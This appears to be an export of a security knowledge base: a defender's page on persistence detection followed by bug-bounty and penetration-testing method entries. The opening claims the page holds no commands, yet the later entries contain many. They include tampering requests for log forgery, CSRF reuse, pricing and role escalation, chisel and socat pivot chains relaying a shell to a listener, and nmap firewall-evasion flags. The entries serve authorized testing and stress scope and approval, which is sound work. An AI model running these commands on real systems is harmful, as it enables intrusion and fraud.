> **How to read this page.** This is a DEFENDER'S reference. It explains what this family of technique is and why it works — enough to recognise it — and then spends most of its length on how it is *detected* and what removes it. It is deliberately not a recipe: there are no commands here, and it will not tell you how to evade anything. If you are testing, the value is knowing what you would be leaving behind; if you are defending, the value is the telemetry and the controls.

## What it is

Anything that causes attacker-controlled code to run again later: autostart entries, services,
scheduled tasks, event-triggered execution (WMI subscriptions, image-file-execution options),
web shells, and account-level persistence such as added credentials or group membership. ATT&CK:
[T1547 Boot or Logon Autostart Execution](https://attack.mitre.org/techniques/T1547), [T1543 Create or Modify System
Process](https://attack.mitre.org/techniques/T1543), [T1053.005 Scheduled Task](https://attack.mitre.org/techniques/T1053/005), [T1546 Event Triggered
Execution](https://attack.mitre.org/techniques/T1546), [T1505.003 Web Shell](https://attack.mitre.org/techniques/T1505/003), [T1098 Account
Manipulation](https://attack.mitre.org/techniques/T1098).

## Why it is the weakest link

Persistence must be **durable**, and durable means **written down**. Unlike in-memory execution
or traffic obfuscation, there is no version of this that leaves no artefact — the artefact *is*
the technique. And the set of locations is finite and well-enumerated: registry autostart keys,
service definitions, task definitions, startup folders, WMI subscriptions, cron/systemd units,
shell profiles, SSH `authorized_keys`, web roots.

That combination — mandatory artefact, small search space — is why persistence is where hunts
find things.

## What a defender should collect

- **Windows Security 4697 / System 7045** — service installed. Near-always worth an alert.
- **Windows Security 4698 / 4702** — scheduled task created or updated, with the task XML.
- **Sysmon EID 12/13/14** — registry writes to Run/RunOnce, IFEO, Winlogon and friends.
- **Sysmon EID 19/20/21** — WMI event filter, consumer and binding creation. Rare and high-value.
- **Sysmon EID 11** — file creation in startup folders and, critically, in **web roots**: a new
  or modified script under a web application's document root is the web-shell detection.
- **Security 4720 / 4728 / 4732 / 4738** — account created, added to a group, or modified.
- **Linux**: `auditd` watches on `/etc/cron*`, `/etc/systemd/system`, `~/.ssh/authorized_keys`,
  shell profile files, and package/unit installation.
- **Periodic autoruns baselining** — snapshot every autostart location per host and diff it. A
  diff-based hunt catches mechanisms you have no specific rule for, which is the point.

## Public detections to start from

- [Suspicious Autorun Registry Modified via WMI](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_autorun_registry_modified_via_wmic.yml)
  — SigmaHQ `c80e66d8-1780-48a9-b412-46663fd21ac0`, high.

SigmaHQ also carries substantial coverage under
[`rules/windows/registry/`](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry) and
[`rules/windows/builtin/security/`](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/security) for the service,
task and account variants.

## A note for testers

Persistence is the artefact most often left behind by accident. Whatever a test installs must be
recorded and removed — the report's Detection footprint section exists partly so that the
defender can confirm every artefact the engagement created was accounted for.

## What removes the gap

Diff-based autoruns baselining catches the whole family, including the mechanisms nobody wrote a
rule for. Add file-integrity monitoring on web roots, alert on service and scheduled-task
creation by default, and treat WMI subscription creation as high severity — it is rare enough to
afford that.

title: Target the Most Recently Added Wildcard (Scope-Change Diff)
summary: Bug-bounty platforms publish scope changes as a dated unified diff. A wildcard added weeks or months ago is surface that, by arithmetic, almost nobody has finished testing — while the program's original scope has been ground over for years. Sort candidate targets by scope-entry AGE, newest first, and hunt there.

steps.text: On the program page open the scope-change history ('View changes' on HackerOne). It renders as a unified diff: green lines are assets ADDED on that date, red lines are assets REMOVED (stop testing those immediately — they are out of scope).
Find the newest ADDED wildcard entry and note its date. A wildcard added 1-3 months ago is the sweet spot: long enough that assets are live, short enough that the crowd has not swept it.
Enumerate that wildcard alone and count live hosts. The ratio that matters is live-hosts-per-week-since-added: hundreds of hosts added two months ago cannot all have been tested.

code.cmd:
subfinder -d newwildcard.example.com -all -silent \
  | httpx -silent -sc -title -tech-detect -o live.txt
wc -l live.txt

steps.text: Cross-check the program's resolved-report count against that host count. A high report count concentrated on the ORIGINAL assets plus a large, recent wildcard is the ideal asymmetry.
Re-check the diff before every session. Assets get removed as well as added, and testing a removed asset is out of scope and unpaid — sometimes worse.

title: Hunt Where the FEWEST Reports Have Resolved, Not the Most
summary: Program pages break resolved reports down per asset. The instinct is to hunt the asset with the most resolved reports because it 'clearly has bugs'. That is backwards: a high resolved count means the surface has been swept repeatedly and the cheap findings are gone and duplicated. Bugs correlate with UNTESTED surface, not with historical bug count.

steps.text: Open the program's per-asset resolved-report breakdown and sort ASCENDING by resolved count, filtering to bounty-eligible assets only.
Discard assets with zero functionality (parked hosts, static marketing) — you want low report count AND real attack surface, not low count because there is nothing there.
Prefer an asset with authenticated functionality, self-service registration and few resolved reports. That combination is the highest expected value on the page.

Caveat worth respecting: learn the product on the MAIN, well-trodden app first. You cannot recognise anomalous behaviour on an obscure subdomain until you know what normal looks like. Learn on the main app, hunt on the quiet one.
Same logic one level down: within a host, prefer endpoints with near-zero inbound links (not reachable from the UI, found only via JS or archives) over the main flows.

title: Use VDPs to Build Signal and Earn Private Invites
summary: A Vulnerability Disclosure Program accepts reports but pays no bounty. Full-time hunters therefore skip them, so competition is low while scope is often enormous. That makes a VDP the cheapest place to convert effort into reputation and signal — which is what actually unlocks paid private programs.

steps.text: Filter for VDPs with a LARGE scope (many wildcards) and healthy responsiveness: reports in the last 90 days, and mean time-to-triage. Around a day or two is good; months means your reputation is frozen while you wait.
Require SAFE HARBOUR in the policy. Without it you have no legal assurance, and an unpaid program is not worth accepting that risk for.
Treat report QUALITY as the product. On a VDP the only return is signal and reputation, and both are damaged by noisy or unproven submissions.
Track the goal honestly: a VDP is a means to private invites, not an end. Once invites arrive, shift hours to paid programs and keep the VDP for practice.
Note that private programs are not automatically paid — a private program can itself be a VDP. Check before committing serious time to an invite.

title: STRIDE Threat Modelling: Turning Finished Recon Into a Test Plan
summary: The gap most hunters stall in is between 'recon is done' and 'what do I actually test?'. Threat modelling is the blue-team practice that closes it: decompose the application into mechanisms, then walk each mechanism through STRIDE — Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege — and write down every attack the mechanism structurally permits. The output is a ranked list of concrete attack vectors to test by hand, instead of scanning and hoping.

steps.text: Understand the app first: primary function, who the VICTIM would be, customer vs internal vs partner facing, monolith or platform, which environments are public, and whether mobile/desktop/browser-extension clients exist (shared auth across clients is where complexity — and bugs — concentrate).

Enumerate MECHANISMS, not endpoints: login, logout, registration, password reset, email change, invite/role assignment, upload, download, payment, export, search. Each mechanism is one threat-model unit.
List NOTABLE OBJECTS (user, org, invoice, file, session). IDOR and access-control testing targets objects, so name them before you test.
Record the SECURITY CONTROLS actually present: HTTPS/HSTS, CSP, CORS, CSRF tokens, cookie flags, rate limits. A control that is absent turns a theoretical attack into a likely one.

For each mechanism, walk the six STRIDE categories and write concrete attacks:
  S — Spoofing -> can I act as another identity? (session theft, token forgery)
  T — Tampering -> can I alter data in flight or at rest? (injection, parameter and price manipulation, mass assignment)
  R — Repudiation -> can I destroy or forge the audit trail?
  I — Information disclosure -> IDOR, verbose errors, stack traces, enumeration
  D — Denial of service -> resource exhaustion (often out of scope; check)
  E — Elevation of privilege -> broken access control, role escalation

Judge each candidate by IMPACT before spending time on it. A useful bar: could this make the news, or could someone sell it? If neither, it is probably a low-severity finding and should be ranked accordingly.
Use STRIDE-P if privacy matters to the target (adds Privacy as a seventh category). For depth on a specific mechanism, pivot to MITRE ATT&CK.
Output an ordered attack-vector list per mechanism and test them manually one by one. This list, not a scanner report, is the actual work plan.

title: Repudiation: Attacking the Audit Trail
summary: The most consistently overlooked STRIDE category in bug bounty. If a user can delete, edit, or forge the log entries that record their own actions — or another user's — then the audit trail is worthless, and for a company under SOC 2 / HIPAA / PCI that is a material finding rather than a curiosity. Almost nobody tests it, which is exactly why it pays.

steps.text: Find every surface that WRITES an audit record: admin activity logs, security events, access history, 'recent devices', export/download history, billing history.
Test whether a user can DELETE or EDIT their own audit records. Self-service log clearing is the cleanest version of this bug.

Test the reviewer boundary: a role whose job is to READ logs (auditor, compliance, read-only admin) must not be able to modify them. An auditor able to rewrite the logs it audits is a high-impact access-control failure.

Test log FORGERY: if a request field (user id, actor, source IP, user-agent) is written to the log without being derived from the session, you can attribute your actions to another user — or frame them into a ban.

code.cmd:
POST /api/v1/action HTTP/1.1
Authorization: Bearer <YOUR_TOKEN>
Content-Type: application/json
X-Forwarded-For: 10.0.0.9

{"actorId":"<VICTIM_USER_ID>","action":"delete"}

steps.text: Check log INJECTION: unescaped newlines in a logged field let you forge whole entries (CRLF into the log stream), which also breaks downstream SIEM parsing.

Articulate impact through COMPLIANCE, not through the bug. Tie it to the audit regime the company operates under — a destroyed or untrustworthy audit trail is an audit finding. Companies frequently announce passing SOC 2 publicly, and it is an annual cycle.

title: Brute-Forcing via the Change-Password Endpoint (Rate-Limit Asymmetry)
summary: Login is the endpoint everyone hardens: rate limits, lockout, CAPTCHA. The change-password endpoint usually is not, because the developer assumes the caller is already the account owner. When that endpoint also takes a user id from the REQUEST rather than the session, it becomes an unthrottled password oracle against any account.

steps.text: Capture the change-password request and inspect the body for an identity field — userId, email, username, accountId. If identity comes from the body rather than purely from the session, that is the precondition for this attack.

code.cmd:
POST /api/v1/account/change-password HTTP/1.1
Cookie: session=<YOUR_SESSION>
Content-Type: application/json

{"userId":"<YOUR_ID>","oldPassword":"...","newPassword":"..."}

steps.text: Confirm the response DISTINGUISHES a wrong old password from other failures ('current password is incorrect' vs a generic error). That distinction is the oracle.

Measure the rate limit on THIS endpoint specifically — do not assume it inherits login's. Send 50-100 wrong old passwords on your own account and watch for 429, lockout, or CAPTCHA. No throttle is the finding.

Swap in another account's id you control (a second test account, never a real user) and confirm the endpoint still answers rather than rejecting on session mismatch. The moment it answers for an id that is not yours, you have both an access-control flaw and an unthrottled oracle.
Demonstrate impact with your OWN second account only: recover its password by guessing, then change it. That is a complete account takeover chain and proves the issue without touching a third party.
Report as chained: missing authorization on the identity field PLUS missing rate limiting. Either alone is medium; together they are account takeover.

title: CSRF Token Binding Failures (Static, Shared, and Cross-Account Tokens)
summary: A CSRF token that EXISTS is not a CSRF token that WORKS. The common failures are not missing tokens but unbound ones: a static token that never rotates, a double-submit pair that only has to match itself, or a token validated as 'well-formed' without being tied to the session it arrived on. Each turns the control into decoration.

steps.text: Rotation: submit the form, reload, and compare the token. If it never changes it is static and any prior leak is permanent.
Enforcement: remove the token entirely, then send an empty value. If the request still succeeds the control is absent in practice.

CROSS-ACCOUNT REUSE — the highest-yield check. Take a valid token from account A and submit it with account B's session. Many servers only verify the token is valid, never that it belongs to the caller.

code.cmd:
POST /api/v1/profile HTTP/1.1
Cookie: session=<ACCOUNT_B_SESSION>
X-CSRF-Token: <TOKEN_ISSUED_TO_ACCOUNT_A>
Content-Type: application/json

{"name":"changed"}

steps.text: Double-submit weakness: if the token is sent as BOTH a cookie and a header, try setting both to the same arbitrary value. If any matching pair passes, the check is self-referential and an attacker who can set a cookie defeats it.
Confirm cookie SameSite. With SameSite=Lax/Strict, classic cross-site CSRF is largely dead, which is why a bare CSRF finding is usually low value.

Treat CSRF as a CHAINING bug. On its own it is often not accepted; combined with a client-side injection (read the token straight out of the DOM) or a permissive CORS policy it becomes an account-takeover step.

title: Price and Amount Tampering (Client-Trusted Pricing)
summary: When the price, quantity, currency, or discount used to charge a customer originates from the CLIENT rather than being recomputed server-side from the catalogue, the amount charged is attacker-controlled. It is a pure business-logic flaw, needs no exotic payload, and remains common on newer e-commerce and checkout integrations.

steps.text: Map the full purchase flow through a proxy: add-to-cart, cart update, checkout initiation, payment-intent creation, confirmation. Note EVERY request in which a monetary value or quantity travels from client to server.
Modify the price/amount in each such request and observe whether the server recomputes it or trusts it. Test at each stage — trust is often enforced at checkout but not at payment-intent creation.

code.cmd:
POST /api/v1/checkout HTTP/1.1
Cookie: session=<YOUR_SESSION>
Content-Type: application/json

{"items":[{"sku":"<SKU>","qty":1,"unitPrice":1}],"total":1}

steps.text: Try the adjacent variants: negative quantity (a refund), negative price, quantity overflow, a cheaper currency with an unvalidated currency code, and fractional amounts that round in your favour.
Attack the DISCOUNT layer separately: stacking a coupon with itself, reusing a single-use code, applying an expired code, or setting a percentage above 100.
Check the confirmation step for whether the AUTHORISED amount is re-verified against the order. Charging 1 unit while receiving goods priced at 1000 is the impact you are proving.

Stop at proof. Use the smallest possible discrepancy on your own account in a test or sandbox environment, capture the receipt showing the mismatch, and do not complete real fraudulent orders or resell anything obtained. Report immediately.

title: Client-Trusted Feature Flags and Entitlement Booleans
summary: Applications ship entitlement decisions to the browser as booleans — hasAccessToX, isAdmin, canManage, plan tiers, feature-flag maps. Flipping them in the response reveals hidden UI instantly. The discipline that makes this worth reporting is proving the SERVER also honours the flip; a UI that unhides is not an authorization bypass.

steps.text: Collect the responses carrying entitlement state: a /feature-flags or /config call, the session/profile object, and any GraphQL query returning permission booleans.

Use a proxy match-and-replace rule on the RESPONSE BODY to flip false to true across those endpoints, then browse. Hidden menus, admin panels and gated features will appear if the gate was client-side.

THE STEP THAT DECIDES THE FINDING: exercise the newly revealed feature and inspect the server's answer. If the API returns 403/402 the control is server-side and you have found nothing but a UI quirk — say so and move on.
If the server DOES honour it, escalate to the highest-value flag: admin/manage rights, tenant scope, or a production/mainnet toggle, and prove a state change rather than a rendered page.
Also flip flags in the REQUEST direction — role, plan, tier or entitlement fields sent on create/update calls are frequently mass-assigned straight into the record.

code.cmd:
PATCH /api/v1/users/me HTTP/1.1
Cookie: session=<YOUR_SESSION>
Content-Type: application/json

{"name":"x","role":"admin","plan":"enterprise"}

steps.text: Related surface worth paying for: features behind a PAYWALL are systematically under-tested because most hunters will not buy a plan. A free trial buys access to surface the crowd has not touched.

title: origin-* Hosts: Reaching the Application Behind the CDN and WAF
summary: Protection usually lives at the CDN edge, not on the application. Any path that reaches the origin directly — a leftover origin-*/direct-*/backend-* hostname, an A record that still points at the real IP, or an IP found by certificate pivoting — serves the same application with the WAF, rate limiting and bot rules removed.

steps.text: Grep enumerated subdomains for the naming convention: origin, origin-www, direct, backend, real, src, lb, edge-bypass.
Resolve each candidate and compare against the CDN's ranges. A host resolving OUTSIDE the CDN while serving the same content is the origin.
Confirm identity by requesting the same path on both and diffing the body; check whether CDN headers (cf-ray, x-cache, via) are absent on the origin.
Verify the protection is actually gone: send a payload the edge blocks and see whether the origin answers it. That difference IS the vulnerability.
Where no origin- host exists, pivot via historical DNS, certificate transparency, and Shodan/Censys favicon or certificate hashes to find the raw IP, then reach it with a spoofed Host header.
Report the exposure itself — an internet-reachable origin defeats every edge control the company believes it has — and note the concrete controls bypassed.

title: Triage Signals: Deciding Which Host Deserves Your Time
summary: After enumeration you hold hundreds of live hosts and can test perhaps a handful properly. The scarce resource is attention, so triage is the skill that matters most. These are cheap, high-signal observations that separate a maintained, hardened host from a forgotten one.

steps.text: DEPRECATED TLS OR A MISMATCHED CERTIFICATE is the strongest staleness signal available. Nobody has renewed it, which means nobody is watching the host.
A 404 ON THE WEB ROOT usually means an API rather than a site — there is no human landing page. Pivot straight to endpoint discovery and documentation paths.
SEVERAL DIFFERENT 404 BODIES from one host mean multiple layers (proxy, gateway, app) or a 404 used to hide authentication state. Both are worth pulling on.
A CUSTOM error page is worth testing; a FRAMEWORK DEFAULT one is not — testing Express's or ASP.NET's stock 404 for reflection is CVE research on the framework, not on the target.

Read the CSP. Permissive values (unsafe-inline, unsafe-eval, wildcards) mean client-side injection is worth chasing, and the allow-list itself LEAKS related domains, revealing dev-to-prod coupling and new scope.

Weigh the crawl/endpoint counts together with a screenshot. Hundreds of crawled URLs plus authenticated functionality plus self-service registration is the profile you want; a splash page with one route is not.
Score and record the decision. Re-deciding which of 700 hosts to test, every session, is the real time sink — write the shortlist down once.

title: Let the Framework Decide What You Test
summary: Identifying the stack is not trivia — it eliminates whole categories of wasted effort and promotes others. The same test is near-worthless against one framework and high-yield against another, and knowing which is which is most of the efficiency gap between a fast hunter and a slow one.

steps.text: NODE / EXPRESS: routes register one HTTP verb explicitly, so HTTP verb tampering rarely pays. Spend the time on MASS ASSIGNMENT instead — front ends commonly PUT a whole object back and the server writes it straight to the database. Take the response object, add key/value pairs you were never sent, and see what sticks.
DJANGO / PHP / RAILS: a single handler often branches on the method internally, so verb confusion IS worth testing — a GET that reaches POST logic bypasses CSRF and sometimes authorization.

FRONT-END WITHOUT A VIRTUAL DOM (Mustache, Backbone, jQuery, server-side templating): reflected and stored XSS plus client-side template injection are live. React/Vue/Angular escape by default, so there concentrate on DOM XSS, dangerouslySetInnerHTML equivalents, and client-side prototype pollution.

JAVA: base64 blobs that decode to serialized objects (look for the ac ed 00 05 prefix or 'rO0AB' in base64) mean deserialization is on the table. Tooling is ysoserial for Java, ysoserial.net for .NET, PHPGGC for PHP; Burp's Java Deserialization Scanner is a starting point but does not cover every gadget chain.
Read the reverse proxy and gateway headers (via, x-kong, x-amzn, server). The gateway often decides which header-based tricks are even possible.

Enumerate API VERSIONS by rolling the path back: if /api/v3/ or /api2/ is live, try /api/v1/ and /api/. Older versions frequently remain deployed with weaker authorization behind a 401 rather than being removed.

title: Vendor Documentation and Policy as a Bug Oracle
summary: Product documentation, developer guides, role descriptions and the privacy policy are the vendor's own written statement of how the system is supposed to behave. Every sentence is a testable assertion, and any deviation is a bug you can prove against the company's own words — which makes it very hard to dispute.

steps.text: Read the developer documentation before testing. It enumerates authentication methods, integrations and features that the UI never exposes, and each one is an attack vector. A single sentence such as 'users can onboard with social login, email OTP, or a PIN with security questions' names three.

Copy ROLE DESCRIPTIONS verbatim ('view only: read access to everything except admin settings, no edit access') and test each clause individually. A role that can do one thing its own description forbids is a clean access-control finding.

Mine the PRIVACY POLICY and security page for factual claims — 'we verify all email addresses', 'sessions expire after 30 minutes', 'we encrypt X at rest'. Verify each. A documented control that does not exist is a valid, easily-argued report.
Check documented LIMITS: quotas, rate limits, plan restrictions, 'five requests per 24 hours'. A stated limit is an invitation to test the bypass.
Read changelogs, release notes and public engineering blogs for newly shipped features. New code is the least-tested code, and the vendor announces it for you.
Quote the documentation directly in the report. Anchoring the finding to the vendor's own statement removes the 'intended behaviour' rebuttal entirely.

title: Multi-Hop Pivot Chains — Holding a Route More Than One Hop Deep
summary: Single-hop pivoting is a syntax problem and every cheat sheet solves it. A chain two or three hops deep is a different problem: your box is not on the deeper networks and nothing there can route back to you, so each hop needs an outbound path AND a return path, its own SOCKS port, and tooling staged from the hop before it rather than from you. This is the discipline that holds a chain together, not the flag syntax.

steps.text: Map the interfaces before you touch a tunnelling tool. Each compromised host's addresses tell you which subnets it BRIDGES, and the chain you can build is exactly that sequence of shared subnets — there is no other route. Record the map; you will be reading it every time a hop misbehaves.

code.cmd:
ip -br a
ip route
arp -a
cat /etc/hosts

steps.text: Internalise the asymmetry that breaks naive chains: hop 1 can reach you, hop 2 CANNOT. Your address is not on hop 2's network and no route to it exists. So a tool that only builds the path from you INWARD leaves you able to scan the deeper network but unable to catch anything it sends back. Every hop past the first needs two separate paths, built with two separate commands.

Outbound path — one SOCKS proxy PER HOP, each on its own local port. Reusing 1080 for every hop is the most common way to end up with a chain you cannot reason about: traffic silently exits at the wrong depth. Give hop 1 one port, hop 2 the next, and name your terminal tabs after them.

code.cmd:
# hop 1: server here, agent on the first compromised host
chisel server -p 8000 --reverse --socks5      # on your box -> SOCKS 127.0.0.1:1080
chisel client <listener>:8000 R:socks         # on hop 1

# hop 2: its agent dials HOP 1, not you — hop 2 cannot see you
chisel client <hop1-internal-ip>:2222 R:5555:socks   # on hop 2

# one line PER HOP, in chain order, at the END of the config
printf 'socks5 127.0.0.1 1080\nsocks5 127.0.0.1 5555\n' >> /etc/proxychains4.conf

steps.text: Return path — a relay chain, one socat per intermediate hop, each forwarding one step closer to you. This is what gives a shell on hop 3 somewhere local to connect to. Build it outward from your listener, and test each link as you add it rather than at the end.

code.cmd:
# your box
nc -lvnp 4444

# hop 1: accepts on 4444, forwards to you
socat TCP-LISTEN:4444,fork,reuseaddr TCP:<listener>:4444 &

# hop 2: accepts on 4444, forwards to hop 1
socat TCP-LISTEN:4444,fork,reuseaddr TCP:<hop1-internal-ip>:4444 &

# hop 3's payload now calls hop 2 — a host it can actually see
# ...and the bytes arrive at your listener

steps.text: Stage tooling from hop N-1, never from your box, and stage STATIC binaries. Hop 2 cannot fetch from you, so serve the files from hop 1. A pivot host regularly has no package manager, no interpreter and no internet, so a dynamically linked binary from your Kali will fail on a glibc mismatch you cannot fix from a half-interactive shell. Check the hash after every transfer: a truncated binary fails in ways that look like a network problem.

code.cmd:
# on hop 1, in the directory holding the static binaries
python3 -m http.server 8080

# on hop 2
wget http://<hop1-internal-ip>:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel
sha256sum /tmp/chisel   # compare against the source host

steps.text: Verify each hop BEFORE extending the chain. One reachability check and one single-port scan through the new hop is enough. Skip this and a broken chain gives you one symptom for three possible causes, with no way to tell which link failed. Remember the SOCKS tax while testing: a SOCKS proxy carries completed TCP only, so -sS and ICMP host discovery return nothing and you must use -sT -Pn.

Add every subnet you route into to the engagement scope FIRST, explicitly. A pivot is the one action that silently widens what your tools can touch, and a scope lock that is amended after the fact was never a control. In HackPit this is a deliberate human amendment through POST /cockpit/tunnels/scope — the only path that widens scope — and starting the listener itself is separately gated.

Tear the chain down in reverse order and write down what you left behind before you do. Each hop is holding a binary in a world-writable directory, a listening port, and possibly a modified proxychains config. Those are findings the client is owed and artefacts you are responsible for removing — and a listener left running past the engagement window is an unowned route into their network.

title: Choosing the Pivot Primitive (Direction, Shape, and Footprint)
summary: Local, remote and dynamic port forwarding are documented everywhere; which one the situation actually permits is not. Three properties decide it and none of them is preference: which way traffic is allowed to flow, whether you need one service or a whole network, and how much you are willing to leave on the compromised host. Decide in that order and the syntax question answers itself.

steps.text: Direction is decided by egress filtering, not by preference. If the compromised host can open an outbound connection to you, use a REVERSE tunnel — it dials out, nothing listens on it, and inbound filtering is irrelevant. Only if you can reach a port ON it does a forward tunnel work. Reverse is the default because outbound is what firewalls usually permit; establish which one applies before you spend an hour debugging a tunnel that was never going to connect.

code.cmd:
# from the compromised host, prove egress before choosing
curl -s -m 5 -o /dev/null -w '%{http_code}\n' http://<listener>:8000/
timeout 5 bash -c '</dev/tcp/<listener>/443' && echo 'egress on 443'

steps.text: Shape follows from how much you need. A PORT FORWARD carries one service on one port: smallest footprint, no wrapper, and the right answer when you already know the single thing you want. A SOCKS proxy carries the whole network but every tool must be wrapped. A layer-3 TUN pivot carries the whole network with no wrapper at all, at the cost of an interface and a route on your box. Start narrow and widen; most people reach for SOCKS when one forwarded port would do.

code.cmd:
# one service
chisel client <listener>:8000 R:8080:<target>:80

# whole network, wrapped
chisel client <listener>:8000 R:socks

# whole network, unwrapped (layer 3)
ligolo-agent -connect <listener>:11601 -ignore-cert

steps.text: Know the SOCKS tax before you commit to SOCKS. A SOCKS proxy relays completed TCP connections and nothing else, so through proxychains a SYN scan and ICMP host discovery both return silence that reads exactly like 'host is down' — you must use -sT -Pn, and slow down, because every probe is a full three-way handshake. UDP services are simply invisible. If you need UDP, ICMP or a real SYN scan, that is the argument for a TUN pivot, not for tuning nmap harder.

code.cmd:
proxychains -q nmap -sT -Pn --max-retries 1 -p 22,80,139,445,3389 <target>
# -sS / -sU / plain ping through SOCKS: no results, no error

steps.text: Footprint is the part that gets skipped. An ordinary forward port-forward leaves a LISTENING PORT on the compromised host — it shows up in the defender's netstat and in any host-based inventory, attributed to your process. The quiet variant moves both listeners onto YOUR box and has the compromised host make two OUTBOUND connections instead, so nothing on it is listening at all.

code.cmd:
# your box: two listeners, joined
socat TCP-LISTEN:8001 TCP-LISTEN:8000,fork,reuseaddr &

# compromised host: two OUTBOUND connections, nothing listening
socat TCP:<listener>:8001 TCP:<target>:80,fork &

# you now reach the internal service on 127.0.0.1:8000

steps.text: If you already hold SSH on the pivot, take the shortcut. sshuttle forwards whole subnets over that existing session with no agent to upload, no listener to start and no wrapper to remember — it needs only SSH and a Python on the far side. Exclude the pivot's own address or the SSH session tries to route through the tunnel it is carrying and drops.

The decision, in one pass. Outbound allowed and you want one service: reverse port forward. Outbound allowed and you want the network: reverse SOCKS, or a TUN pivot if you need non-TCP. You can reach a port on the host but it cannot reach you: forward tunnel. You already have SSH: sshuttle. You are two hops deep: none of these alone — you need a return path as well, which is a chain, not a primitive.

Whichever you pick, the tunnel does not change what you are permitted to reach. The subnet has to be in scope before traffic enters it, and in HackPit starting any pivot listener is a gated action that requires an active engagement and an explicit human approval. Routing a command through a tunnel must never be a way to reach something the same command would have been refused for.

title: Reading a Packet Filter — ACL Enumeration and Scan-Time Evasion
summary: A port that does not answer has told you something about the FILTER, not about the port. Most scanning notes treat that silence as 'closed' and move on, which throws away the perimeter device as an object of enumeration and leaves you unable to say whether a service is absent or merely unreachable from where you are standing. This is how to map the filter itself: separate refused from dropped, use the scan types that report reachability rather than port state, locate the device on the path, and only then adapt the scan to what that device does not inspect.

steps.text: Start from the three-state model, because two of the states look identical if you only run a default scan. OPEN answers with SYN/ACK. CLOSED answers with RST — the packet reached a live host and was refused. FILTERED does not answer at all, or comes back as ICMP unreachable type 3 code 13 (administratively prohibited), which is a router telling you it dropped the packet on policy. That ICMP is the single most useful reply on an external test: it names the filtering device's address in the packet header.

code.cmd:
# --reason prints WHY nmap assigned each state; without it you cannot
# tell a dropped probe from a refused one
nmap -sS --reason -p 22,80,443,3389 <target>

# the ICMP admin-prohibited reply names the device that dropped it
nmap -sS --reason -p- <target> | grep -i 'admin-prohibited'

steps.text: Run an ACK scan to map the ACL rather than the host. -sA deliberately tells you NOTHING about whether a port is open: a bare ACK gets a RST from any live host, open or closed. What it distinguishes is 'unfiltered' (the RST came back, so the filter PASSED your packet) from 'filtered' (nothing came back). Diff that against the SYN scan and you have the rule set: ports that are unfiltered but closed are holes in the ACL with no service behind them, and ports filtered under ACK but open under SYN indicate stateful inspection rather than a static list.

code.cmd:
nmap -sA --reason -p1-65535 <target> -oA acl-ack
nmap -sS --reason -p1-65535 <target> -oA acl-syn

# the interesting set is the difference between the two
comm -3 <(grep -E '^[0-9]+/tcp' acl-ack.gnmap | sort) \
        <(grep -E '^[0-9]+/tcp' acl-syn.gnmap | sort)

steps.text: Where the ACK scan comes back uniformly filtered, try a window scan. -sW sends the same bare ACK but reads the TCP window field of the RST instead of merely noting that a RST arrived. A number of stacks set a non-zero window for open ports and zero for closed ones, which recovers real port state through a device that an ACK scan could only call 'unfiltered'. It is stack-dependent and it lies on modern targets — treat a -sW result as a hypothesis to confirm, never as a finding on its own.

Locate the device on the path before you try to get around it. Firewalking sends probes with the TTL set to expire ONE hop past the last router you can see: if the probe is forwarded you get an ICMP time-exceeded from beyond the filter, and if it is dropped you get nothing — so the port is being filtered by THAT hop rather than by the host. This turns 'something is filtering' into 'this address is filtering, on these ports'.

code.cmd:
# establish the path first - the last responding hop is the candidate
traceroute -n -T -p 80 <target>

# then let nmap do the TTL arithmetic per port
nmap --script firewalk --traceroute <target>

steps.text: Now adapt the scan, choosing the technique that matches what the device fails to inspect. Fragmentation (-f, or --mtu at a multiple of 8) splits the TCP header across IP fragments so a filter that matches on port numbers without reassembling sees no port to match; it is defeated by anything that reassembles, which is most modern kit. Source-port trust is the more productive one in practice: many rule sets still permit inbound traffic FROM 53, 123 or 20 on the assumption that it is a reply, so --source-port walks straight through. --data-length breaks the fixed payload length that some IDS signatures key on, and --spoof-mac only matters where the control is a MAC allowlist on the local segment.

code.cmd:
nmap -f <target>                       # fragment
nmap --mtu 16 <target>                 # explicit size, MUST be /8
nmap --source-port 53 <target>         # -g 53 is the same flag
nmap --data-length 25 <target>         # break fixed-length signatures
nmap --spoof-mac 0 <target>            # random MAC, local segment only

steps.text: Understand what decoys actually buy before you reach for them, because the common belief about them is wrong in two ways. -D does NOT hide you: your real address is still in the set, so the defender's job goes from reading one address to reading N, and correlation across a long scan usually recovers you anyway. Worse, a decoy address that is OFFLINE cannot complete the handshakes you are attributing to it, so the target is left holding half-open connections from a dead host — you have run a small SYN flood against your client and it will appear in their logs as exactly that. Only use live, in-scope decoys, and note that full source spoofing (-S) forfeits the replies entirely unless you are positioned to sniff them.

code.cmd:
# prefer named, verified-live decoys over RND
nmap -D <live-ip-1>,<live-ip-2>,ME <target>

# -S needs -e and only makes sense where you can read the answers
nmap -S <spoofed-ip> -e eth0 <target>

steps.text: Finally, slow down rather than dressing up. Most perimeter alerting is rate-based — N connections to M ports inside a window — so timing beats packet trickery on any device that reassembles fragments. --scan-delay puts a floor between probes and -T2 or lower pulls the whole profile down. Confirm anything you found from a second vantage point before you report it: a port that is open from one source address and filtered from another is a finding about the ACL, and it is the finding the client most wants.

title: Scanning an ICS/OT Segment Without Knocking It Over
summary: On an IT network the scan is reconnaissance and the exploit is the risk. On an OT segment the SCAN is the risk. Controllers run tiny embedded TCP stacks with a handful of connection slots and no expectation of being probed, and a default nmap invocation faults them often enough that it is a normal outcome rather than bad luck — the version-detection probes in particular exist to send deliberately malformed protocol traffic. A faulted PLC is not a ticket; it is a stopped process and potentially a safety event. This is the discipline that lets you enumerate one anyway.

steps.text: Establish that you are on OT before you scan, and do not rely on being told. The protocol ports are the reliable tell: 502 (Modbus/TCP), 102 (S7comm over ISO-TSAP), 20000 (DNP3), 44818 and 2222 (EtherNet/IP/CIP), 47808/udp (BACnet), 4840 (OPC UA). If any of those answer, treat the whole segment as fragile until proven otherwise — flat OT networks are the norm, so one controller means the engineering workstations and the historian are probably sharing the broadcast domain with it.

code.cmd:
# a single, slow, connect-scan probe of the OT tells - nothing else yet
nmap -n -Pn -sT --max-parallelism 1 --scan-delay 500ms \
     -p 102,502,4840,20000,44818,2222 <range>

